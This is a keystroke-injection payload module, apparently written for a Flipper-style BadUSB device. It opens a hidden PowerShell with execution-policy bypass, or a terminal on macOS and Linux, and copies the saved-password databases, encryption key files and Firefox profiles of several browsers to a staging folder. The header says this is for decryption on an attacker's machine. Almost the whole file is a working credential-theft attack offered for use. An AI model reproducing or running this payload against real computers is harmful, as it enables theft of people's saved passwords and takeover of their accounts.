# FlipperPwn Module: Browser Saved Credential Staging
# Copies browser credential database files to a staging location for off-device analysis.
# Chrome/Edge encrypt passwords with DPAPI (Windows) or Keychain (macOS) — decryption
# must be performed on an attacker machine using tools like HackBrowserData or SharpChrome.
# This module handles the file copy step only.

NAME browser_creds
DESCRIPTION Stage browser credential database files for off-device decryption
CATEGORY credential
PLATFORMS WIN,MAC,LINUX

# No options required — targets Chrome, Edge, Brave, and Firefox

PLATFORM WIN
  # Open hidden PowerShell via Run dialog
  DELAY 500
  GUI r
  DELAY 300
  STRING powershell -w h -nop -ep bypass
  ENTER
  DELAY 1000
  # Copy Login Data (SQLite) and Local State (DPAPI key) for each Chromium browser.
  # SQLite file is locked while browser is open — copy to TEMP to bypass file lock.
  STRING $s="$env:TEMP\browser_stage"; New-Item -ItemType Directory -Force -Path $s | Out-Null; $browsers=@{Chrome="$env:LOCALAPPDATA\Google\Chrome\User Data";Edge="$env:LOCALAPPDATA\Microsoft\Edge\User Data";Brave="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"}; $browsers.GetEnumerator() | ForEach-Object { $d="$s\$($_.Key)"; New-Item -ItemType Directory -Force -Path $d | Out-Null; Copy-Item "$($_.Value)\Default\Login Data" "$d\Login_Data" -ErrorAction SilentlyContinue; Copy-Item "$($_.Value)\Local State" "$d\Local_State" -ErrorAction SilentlyContinue }; $ff="$env:APPDATA\Mozilla\Firefox\Profiles"; if(Test-Path $ff){Copy-Item $ff "$s\Firefox_Profiles" -Recurse -ErrorAction SilentlyContinue}; explorer $s
  ENTER

PLATFORM MAC
  # Open Terminal via Spotlight
  DELAY 500
  GUI SPACE
  DELAY 400
  STRING Terminal
  ENTER
  DELAY 1200
  # Copy Chromium Login Data and Local State; copy Firefox profile directory
  STRING s=/tmp/browser_stage; mkdir -p $s; for b in "Google/Chrome" "Microsoft Edge" "BraveSoftware/Brave-Browser"; do bname=$(basename "$b"); mkdir -p "$s/$bname"; cp ~/Library/Application\ Support/$b/Default/Login\ Data "$s/$bname/Login_Data" 2>/dev/null; cp ~/Library/Application\ Support/$b/Local\ State "$s/$bname/Local_State" 2>/dev/null; done; [ -d ~/Library/Application\ Support/Firefox/Profiles ] && cp -r ~/Library/Application\ Support/Firefox/Profiles "$s/Firefox_Profiles" 2>/dev/null; open $s
  ENTER

PLATFORM LINUX
  # Open terminal emulator
  DELAY 500
  CTRL ALT t
  DELAY 1000
  # Copy from ~/.config for Chromium-based and ~/.mozilla for Firefox
  STRING s=/tmp/browser_stage; mkdir -p $s; for b in google-chrome microsoft-edge-dev BraveSoftware/Brave-Browser; do bname=$(basename "$b"); mkdir -p "$s/$bname"; cp ~/.config/$b/Default/Login\ Data "$s/$bname/Login_Data" 2>/dev/null; cp ~/.config/$b/Local\ State "$s/$bname/Local_State" 2>/dev/null; done; [ -d ~/.mozilla/firefox ] && cp -r ~/.mozilla/firefox "$s/Firefox_Profiles" 2>/dev/null; xdg-open $s 2>/dev/null || echo "Staged to $s"
  ENTER
